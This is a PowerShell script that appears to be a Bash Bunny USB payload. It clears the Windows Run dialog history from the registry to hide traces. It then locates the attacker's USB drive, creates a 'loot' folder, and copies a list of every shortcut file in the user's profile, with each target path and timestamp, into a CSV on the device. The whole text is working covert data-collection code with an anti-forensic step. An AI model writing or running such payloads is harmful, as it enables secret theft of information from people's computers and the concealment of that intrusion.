#Remove run history
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

#Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "bashbunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

#See if a loot folder exist in usb. If not create one
$TARGETDIR = $backupDrive + "\loot"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#See if a info folder exist in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\Link-Files"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#Create a path that will be used to make the file
$datetime = get-date -f yyyy-MM-dd_HH-mm
$backupPath = $backupDrive + "\loot\Link-Files\"

#Create output from info script
$TARGETDIR = $MyInvocation.MyCommand.Path
$TARGETDIR = $TARGETDIR -replace ".......$"
cd $TARGETDIR

$files = Get-ChildItem $env:USERPROFILE -Recurse -Filter *.lnk | select-object -Expand Fullname


foreach ($file in $files)
{

$sh = New-Object -ComObject WScript.Shell
$target = $sh.CreateShortcut($file).TargetPath
$created = (Get-ItemProperty $file).CreationTime
$written = (Get-ItemProperty $file).LastWriteTime

[PSCustomObject]@{
       Linkfile = $file
       Target = $target 
       File_Created = $created
       Last_Written = $written
       } | Export-Csv $backupPath\link_files.csv -notype -Append 
}
